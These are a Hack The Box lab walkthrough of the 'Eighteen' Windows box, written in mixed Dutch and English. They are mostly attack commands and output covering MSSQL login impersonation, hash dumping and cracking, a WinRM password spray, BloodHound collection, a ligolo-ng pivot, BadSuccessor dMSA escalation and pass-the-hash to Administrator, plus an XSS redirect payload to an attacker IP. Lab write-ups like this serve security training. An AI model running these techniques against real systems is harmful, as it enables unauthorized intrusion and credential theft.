# Machine Information

As is common in real life Windows penetration tests, you will start the Eighteen box with credentials for the following account: kevin / iNa2we6haRj2gaw!
# Initial Enumeration

## Port Scanning

### Full Port scan

As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.

```
┌──(kali㉿kali)-[~/HTB/Eighteen]
└─$ nmap -p- 10.129.3.182        
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-17 04:05 CET
Stats: 0:01:43 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 99.34% done; ETC: 04:07 (0:00:01 remaining)
Nmap scan report for eighteen.htb (10.129.3.182)
Host is up (0.019s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
1433/tcp open  ms-sql-s
5985/tcp open  wsman
```
### Detailed port scan

At the detailed port scan go to get more information from the host.

```
┌──(kali㉿kali)-[~/HTB/Eighteen]
└─$ nmap -p80,5985 -sCV 10.129.3.182
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-17 03:39 CET
Nmap scan report for 10.129.3.182
Host is up (0.016s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://eighteen.htb/
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```


Dit kan ik later mss nog gebruiken

```
Registration failed. Username or email may already exist. ('42000', "[42000] [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]String or binary data would be truncated in table 'financial_planner.dbo.users', column 'username'. Truncated value: '<script>document.location=''http://10.10.16.70:8001'. (2628) (SQLExecDirectW); [42000] [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]The statement has been terminated. (3621
```

zien waar ik de appdev user kan vinden

```
┌──(kali㉿kali)-[~/HTB/Eighteen/impacket/examples]
└─$ python3 mssqlclient.py eighteen.htb/kevin:'iNa2we6haRj2gaw!'@10.129.3.182 
Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (kevin  guest@master)>
    




```
Ik ben een keer gaan enumerate op de users die ingeloged zijn geweest.

```
SQL (kevin  guest@master)> enum_logins
name     type_desc   is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin   
------   ---------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------   
sa       SQL_LOGIN             0          1               0             0            0              0           0           0           0   

kevin    SQL_LOGIN             0          0               0             0            0              0           0           0           0   

appdev   SQL_LOGIN             0          0               0             0            0              0           0           0
```

Nu dat we dit weten kan ik de login gaan impersonate als user appdev

```
SQL (kevin  guest@msdb)> exec_as_login appdev

SQL (appdev  guest@msdb)> select * from financial_planner.dbo.users;
  id   full_name   username   email                password_hash                                                                                            is_admin   created_at   
----   ---------   --------   ------------------   ------------------------------------------------------------------------------------------------------   --------   ----------   
1002   admin       admin      admin@eighteen.htb   pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133          1   2025-10-29 05:39:03
```
Cracken van admin password moet nog gedaan worden. https://raw.githubusercontent.com/davidzzo23/pbkdf2_sha256_cracker/refs/heads/main/pbkdf2_sha256_cracker.py https://notes.benheater.c
om/books/hash-cracking/page/pbkdf2-hmac-sha256

Doordat de salt en de hash nog niet naar een base64 code is omgezet zullen we dit eerst moeten gaan omzetten door het volgende te doen.

```
┌──(kali㉿kali)-[~/HTB/Eighteen]
└─$ python3 crack.py                                                                                 
sha256:600000:QU10enRlUUlHN3lBYlpJYQ==:BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=

echo 'sha256:600000:QU10enRlUUlHN3lBYlpJYQ==:BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=' > hash4
┌──(kali㉿kali)-[~/HTB/Eighteen]
└─$ hashcat -a 0 -m 10900 hash4 /usr/share/wordlists/rockyou.txt
sha256:600000:QU10enRlUUlHN3lBYlpJYQ==:BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=:**iloveyou1**
```

Daarna kan ik het password gebruiken voor eens in te loggen op de admin panel op de webpagina.
![[Pasted image 20251117112247.png]]

Ook een scan laten lopen op de onderstaande users voor te zien bij welke user ik het password kan gebruiken voor in te loggen op de windows machine.

```
┌──(kali㉿kali)-[~/HTB/Eighteen]
└─$ nxc  mssql DC01.eighteen.htb -u kevin -p 'iNa2we6haRj2gaw!' --local-auth --rid-brute
MSSQL       10.129.3.182    1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb)
MSSQL       10.129.3.182    1433   DC01             [+] DC01\kevin:iNa2we6haRj2gaw! 
MSSQL       10.129.3.182    1433   DC01             498: EIGHTEEN\Enterprise Read-only Domain Controllers
MSSQL       10.129.3.182    1433   DC01             500: EIGHTEEN\Administrator
MSSQL       10.129.3.182    1433   DC01             501: EIGHTEEN\Guest
MSSQL       10.129.3.182    1433   DC01             502: EIGHTEEN\krbtgt
MSSQL       10.129.3.182    1433   DC01             512: EIGHTEEN\Domain Admins
MSSQL       10.129.3.182    1433   DC01             513: EIGHTEEN\Domain Users
MSSQL       10.129.3.182    1433   DC01             514: EIGHTEEN\Domain Guests
MSSQL       10.129.3.182    1433   DC01             515: EIGHTEEN\Domain Computers
MSSQL       10.129.3.182    1433   DC01             516: EIGHTEEN\Domain Controllers
MSSQL       10.129.3.182    1433   DC01             517: EIGHTEEN\Cert Publishers
MSSQL       10.129.3.182    1433   DC01             518: EIGHTEEN\Schema Admins
MSSQL       10.129.3.182    1433   DC01             519: EIGHTEEN\Enterprise Admins
MSSQL       10.129.3.182    1433   DC01             520: EIGHTEEN\Group Policy Creator Owners
MSSQL       10.129.3.182    1433   DC01             521: EIGHTEEN\Read-only Domain Controllers
MSSQL       10.129.3.182    1433   DC01             522: EIGHTEEN\Cloneable Domain Controllers
MSSQL       10.129.3.182    1433   DC01             525: EIGHTEEN\Protected Users
MSSQL       10.129.3.182    1433   DC01             526: EIGHTEEN\Key Admins
MSSQL       10.129.3.182    1433   DC01             527: EIGHTEEN\Enterprise Key Admins
MSSQL       10.129.3.182    1433   DC01             528: EIGHTEEN\Forest Trust Accounts
MSSQL       10.129.3.182    1433   DC01             529: EIGHTEEN\External Trust Accounts
MSSQL       10.129.3.182    1433   DC01             553: EIGHTEEN\RAS and IAS Servers
MSSQL       10.129.3.182    1433   DC01             571: EIGHTEEN\Allowed RODC Password Replication Group
MSSQL       10.129.3.182    1433   DC01             572: EIGHTEEN\Denied RODC Password Replication Group
MSSQL       10.129.3.182    1433   DC01             1000: EIGHTEEN\DC01$
MSSQL       10.129.3.182    1433   DC01             1101: EIGHTEEN\DnsAdmins
MSSQL       10.129.3.182    1433   DC01             1102: EIGHTEEN\DnsUpdateProxy
MSSQL       10.129.3.182    1433   DC01             1601: EIGHTEEN\mssqlsvc
MSSQL       10.129.3.182    1433   DC01             1602: EIGHTEEN\SQLServer2005SQLBrowserUser$DC01
MSSQL       10.129.3.182    1433   DC01             1603: EIGHTEEN\HR
MSSQL       10.129.3.182    1433   DC01             1604: EIGHTEEN\IT
MSSQL       10.129.3.182    1433   DC01             1605: EIGHTEEN\Finance
MSSQL       10.129.3.182    1433   DC01             1606: EIGHTEEN\jamie.dunn
MSSQL       10.129.3.182    1433   DC01             1607: EIGHTEEN\jane.smith
MSSQL       10.129.3.182    1433   DC01             1608: EIGHTEEN\alice.jones
MSSQL       10.129.3.182    1433   DC01             1609: EIGHTEEN\adam.scott
MSSQL       10.129.3.182    1433   DC01             1610: EIGHTEEN\bob.brown
MSSQL       10.129.3.182    1433   DC01             1611: EIGHTEEN\carol.white
MSSQL       10.129.3.182    1433   DC01             1612: EIGHTEEN\dave.green

```
# Password spray

```           
┌──(kali㉿kali)-[~/HTB/Eighteen]
└─$ netexec winrm eighteen.htb -u names.txt -p iloveyou1
WINRM       10.129.64.223   5985   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb)
WINRM       10.129.64.223   5985   DC01             [-] EIGHTEEN\jamie.dunn:iloveyou1
WINRM       10.129.64.223   5985   DC01             [-] EIGHTEEN\jane.smith:iloveyou1
WINRM       10.129.64.223   5985   DC01             [-] EIGHTEEN\alice.jones:iloveyou1
WINRM       10.129.64.223   5985   DC01             [+] EIGHTEEN\adam.scott:iloveyou1 (Pwn3d!)
```

Nu dat we dit weten kunnen we gaan inloggen als de user adam.scott op de windows machine.

```                                                                                                        
┌──(kali㉿kali)-[~/HTB/Eighteen]
└─$ evil-winrm -i 10.129.3.182 -u adam.scott -p iloveyou1                           
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                      
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                 
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\adam.scott\Documents> ls
*Evil-WinRM* PS C:\Users\adam.scott\Documents> cd ..
*Evil-WinRM* PS C:\Users\adam.scott> ls


    Directory: C:\Users\adam.scott


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---        11/10/2025   4:40 PM                Desktop
d-r---         9/13/2025  12:55 AM                Documents
d-r---          4/1/2024  12:01 AM                Downloads
d-r---          4/1/2024  12:01 AM                Favorites
d-r---          4/1/2024  12:01 AM                Links
d-r---          4/1/2024  12:01 AM                Music
d-r---          4/1/2024  12:01 AM                Pictures
d-----          4/1/2024  12:01 AM                Saved Games
d-r---          4/1/2024  12:01 AM                Videos


*Evil-WinRM* PS C:\Users\adam.scott> cd Desktop
*Evil-WinRM* PS C:\Users\adam.scott\Desktop> ls


    Directory: C:\Users\adam.scott\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---        11/16/2025   6:39 PM             34 user.txt


*Evil-WinRM* PS C:\Users\adam.scott\Desktop> cat user.txt
eae54f2e475a9cc7b066702cc6e91b7e
*Evil-WinRM* PS C:\Users\adam.scott\Desktop>
```

Gegevens van de ldap server gaan halen.

```
*Evil-WinRM* PS C:\Users\adam.scott\Desktop> upload ./SharpHound.exe
*Evil-WinRM* PS C:\Users\adam.scott\Desktop> ./SharpHound.exe --CollectionMethods All
*Evil-WinRM* PS C:\Users\adam.scott\Desktop> download 20251117094755_BloodHound.zip
```

We gaan de zip file nu gaan downloaden en eens bekijken of dat we het path naar admin niet kunnen vinden.

![[Pasted image 20251117115500.png]]

Voor dat we onze ticket zullen kunnen aanvragen, zal je als eerst een proxy tunnel moeten opzetten naar de server. https://olivierkonate.medium.com/pivoting-made-easy-with-ligolo-ng-17a4a8a539df https://github.com/nicocha30/ligolo-ng/releases

```
┌──(kali㉿kali)-[~/HTB/Eighteen]
└─$ sudo ./proxy -selfcert

ligolo-ng » session
? Specify a session : 1 - EIGHTEEN\adam.scott@DC01 - 10.129.132.30:62729 - 00505694e463
[Agent : EIGHTEEN\adam.scott@DC01] » start
INFO[0085] Starting tunnel to EIGHTEEN\adam.scott@DC01 (00505694e463)
```

https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory

```
Get Ticket,
faketime "$(ntpdate -q 240.0.0.1 | grep -oP '^\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}')" impacket-getTGT eighteen.htb/adam.scott:iloveyou1 -dc-ip 240.0.0.1

Initiate The Exploit, https://github.com/ibaiC/BadSuccessor/blob/main/BadSuccessor/obj/Debug/BadSuccessor.exe
*Evil-WinRM* PS C:\Users\adam.scott\Documents> .\BadSuccessor.exe escalate -targetOU "OU=Staff,DC=eighteen,DC=htb" -targetUser "CN=ADministrator,CN=Users,DC=eighteen,DC=htb" -dmsa Evil_Machine -user adam.scott -dnshostname Evil_Machine

export ticket,
export KRB5CCNAME=adam.scott.ccache

┌──(kali㉿kali)-[~/HTB/Eighteen]
└─$ faketime "$(ntpdate -q 240.0.0.1 | grep -oP '^\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}')" python3 getST.py -k -no-pass -impersonate Evil_Machine$ -self -dmsa eighteen.htb/adam.scott -dc-ip 240.0.0.1
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating Evil_Machine$
[*] Requesting S4U2self
[*] Current keys:
[*] EncryptionTypes.aes256_cts_hmac_sha1_96:a4611ffdbe85ecba2734aedcc0c7fe7ed1f745c8618ebc0b691d3cd9ee88358d
[*] EncryptionTypes.aes128_cts_hmac_sha1_96:97cbc81d7e6fbac860c3fd2acc3a8579
[*] EncryptionTypes.rc4_hmac:9e7bb268971e7e718a8249c7037f0b84
[*] Previous keys:
[*] EncryptionTypes.rc4_hmac:0b133be956bfaddf9cea56701affddec
[*] Saving ticket in Evil_Machine$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache

```

Zoals je hierboven kunt zien hebben we de hash voor admin login gevonden.

```
┌──(kali㉿kali)-[~/HTB/Eighteen/impacket/examples]
└─$ evil-winrm -i 10.129.4.243 -u Administrator -H 0b133be956bfaddf9cea56701affddec
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                      
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                 
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls


    Directory: C:\Users\Administrator\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/29/2025   5:40 AM           1226 clean_OU.ps1
-a----         11/8/2025   7:18 AM            421 warmup_flask.ps1


*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> ls


    Directory: C:\Users\Administrator


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---         3/23/2025   8:38 PM                Contacts
d-r---        11/10/2025   4:39 PM                Desktop
d-r---        11/10/2025  10:52 AM                Documents
d-r---         3/23/2025   8:38 PM                Downloads
d-r---         3/23/2025   8:38 PM                Favorites
d-r---         3/23/2025   8:38 PM                Links
d-r---         3/23/2025   8:38 PM                Music
d-r---         3/23/2025   8:38 PM                Pictures
d-r---         3/23/2025   8:38 PM                Saved Games
d-r---         3/23/2025   8:38 PM                Searches
d-r---         3/23/2025   8:38 PM                Videos
-a----         9/12/2025   2:12 AM             13 qc


*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---        11/17/2025  11:42 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
ff8a02c9108786a60dea975db82a8853
```

![[Pasted image 20251117140923.png]]